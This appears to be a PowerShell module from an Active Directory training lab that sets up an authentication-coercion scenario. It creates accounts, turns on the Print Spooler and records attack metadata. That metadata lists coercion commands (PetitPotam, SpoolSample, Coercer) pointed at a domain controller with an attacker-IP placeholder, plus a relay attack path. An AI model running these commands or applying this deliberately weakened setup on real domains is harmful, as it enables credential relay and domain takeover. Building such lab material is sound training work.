#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    Deploys Authentication Coercion configuration.
.DESCRIPTION
    Configures environment attributes (Spooler service, delegation) to demonstrate auth coercion.
#>

function Deploy-CoercionSetup {
    [CmdletBinding()]
    param(
        [string]$Difficulty = 'Medium',
        [string]$DomainDN,
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Authentication Coercion Setup..." -Type Info

    $password = Get-VulnPassword -Difficulty $Difficulty -Index 4
    $user = New-VulnUser -SamAccountName 'z.kowalski' -Name 'Zofia Kowalski' -Password $password -DomainDN $DomainDN -Description 'Security Operations Analyst'

    $svcPassword = Get-VulnPassword -Difficulty $Difficulty -Index 5
    $svcUser = New-VulnUser -SamAccountName 'svc_print' -Name 'Print Services Account' -Password $svcPassword -DomainDN $DomainDN -Description 'Print Spooler Service Account' -ServiceAccount

    try {
        Set-Service -Name Spooler -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service Spooler -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Print Spooler service configured and started." -Type Success
    } catch {}

    Write-VulnResult -Name 'Coercion Setup' -Detail 'Spooler service active, svc_print created' -Success $true -IsLast

    return @{
        Scenario       = 'CoercionSetup'
        Description    = 'Print Spooler and RPC endpoints configured for authentication coercion testing'
        CreatedObjects = @('z.kowalski', 'svc_print')
        AttackCommands = @(
            'PetitPotam.py <attacker_ip> <dc_ip>',
            'SpoolSample.exe <dc_name> <attacker_ip>',
            'Coercer.py -u z.kowalski -p <pass> -t <dc_ip> -l <attacker_ip>'
        )
        AttackPath     = 'z.kowalski -> Coerce DC Authentication (PetitPotam/PrinterBug) -> Relay to LDAP/HTTP'
        MitreID        = 'T1187'
        Difficulty     = $Difficulty
    }
}

function Remove-CoercionSetup {
    [CmdletBinding()]
    param([string]$DomainDN)

    try {
        Remove-ADUser -Identity 'z.kowalski' -Confirm:$false -ErrorAction SilentlyContinue
        Remove-ADUser -Identity 'svc_print' -Confirm:$false -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Removed Coercion Setup scenario objects." -Type Success
    } catch {
        Write-VulnStatus -Message "Cleanup error: $_" -Type Warning
    }
}

function Test-CoercionSetup {
    [CmdletBinding()]
    param([string]$DomainDN)

    $u = Get-ADUser -Filter "samAccountName -eq 'z.kowalski'" -ErrorAction SilentlyContinue
    return ($null -ne $u)
}
